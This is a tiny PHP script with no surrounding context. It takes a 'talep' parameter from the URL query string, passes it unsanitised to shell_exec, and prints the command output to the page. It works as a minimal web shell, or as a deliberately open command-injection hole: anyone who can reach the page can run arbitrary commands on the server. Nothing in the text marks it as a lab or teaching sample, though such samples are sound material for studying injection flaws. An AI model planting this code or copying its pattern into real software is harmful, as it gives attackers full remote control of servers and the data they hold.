<?php
if( isset( $_GET[ 'Submit' ]  ) ) {
    $talep = $_GET[ 'talep' ];
    $komut=shell_exec(''.$talep.' /?');
    echo "<pre>{$komut}</pre>";
}?>